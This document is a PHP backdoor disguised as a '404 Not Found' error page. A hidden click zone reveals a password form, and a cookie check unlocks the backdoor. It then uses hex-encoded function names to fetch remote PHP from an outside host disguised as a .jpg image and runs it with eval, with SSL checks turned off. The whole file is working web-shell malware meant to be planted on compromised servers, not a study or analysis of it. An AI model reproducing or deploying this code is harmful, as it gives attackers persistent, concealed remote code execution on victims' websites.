<?php
/**
 * @package    
 * @copyright  
 */

function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'tuwaga1337'; 
}

if (is_logged_in()) {
    $Array = array(
        '666f70656e',
        '73747265616d5f6765745f636f6e74656e7473',
        '66696c655f6765745f636f6e74656e7473',
        '6375726c5f65786563'
    );

    function hex2str($hex) {
        $str = '';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $str .= chr(hexdec(substr($hex, $i, 2)));
        }
        return $str;
    }

    function geturlsinfo($destiny) {
        $belief = array_map('hex2str', $GLOBALS['Array']);
        if (function_exists($belief[3])) { 
            $ch = curl_init($destiny);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $love = $belief[3]($ch);
            curl_close($ch);
            return $love;
        } elseif (function_exists($belief[2])) { 
            return $belief[2]($destiny);
        } elseif (function_exists($belief[0]) && function_exists($belief[1])) { 
            $purpose = $belief[0]($destiny, "r");
            $love = $belief[1]($purpose);
            fclose($purpose);
            return $love;
        }
        return false;
    }

    $destiny = 'https://privatetuwaga.pages.dev/tuwaga.jpg';
    $dream = geturlsinfo($destiny);
    if ($dream !== false) {
        eval('?>' . $dream);
    }
} else {
    if (isset($_POST['password'])) {
        $entered_key = $_POST['password'];
        $hashed_key = '$2y$10$SvmnJbiC6R7wn6eIdQnrdOISGiDnWDntEy.KLXVIZmPLK31tdE0iC'; 
        
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', 'tuwaga1337', time() + 3600, '/'); 
            header("Location: ".$_SERVER['PHP_SELF']); 
            exit();
        }
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>404 Not Found</title>
<link rel="icon" type="image/x-icon" href="#">
<style>
body {
  margin: 0;
  background-color: #000;
  color: #999;
  font-family: Arial, sans-serif;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  height: 100vh;
  text-align: center;
}

h1 {
  font-size: 185px;
  color: #444;
  margin: 0;
}

h2 {
  font-size: 39px;
  color: #888;
  margin: 10px 0 15px;
}

p {
  color: #777;
  font-size: 19px;
  margin-bottom: 45px;
}

#trigger-zone {
  width: 100%;
  height: 35px;
  cursor: pointer;
  position: relative;
}

form {
  display: none;
  margin-top: -10px;
}

input[type="password"] {
  width: 150px;                
  padding: 4px;                
  border: none;
  background: #000;
  color: #fff;
  outline: none;
  font-size: 12px;             
  border-radius: 2px;
  text-align: center;
  box-shadow: 0 0 0 1px #ffffff13;  
  transition: all 0.3s ease-in-out;
}
input[type="password"]:focus {
  box-shadow: 0 0 4px #ffffff13;
}
</style>
</head>
<body>

<h1>404</h1>
<h2>Not Found</h2>
<p>The resource requested could not be found on this server!</p>

<div id="trigger-zone"></div>

<form method="post" id="login-form">
  <input type="password" name="password" required>
</form>

<script>
const trigger = document.getElementById('trigger-zone');
const form = document.getElementById('login-form');
let revealed = false;

trigger.addEventListener('click', () => {
  if (!revealed) {
    form.style.display = 'block';
    revealed = true;
  }
});
</script>

</body>
</html>
<?php
}
?>
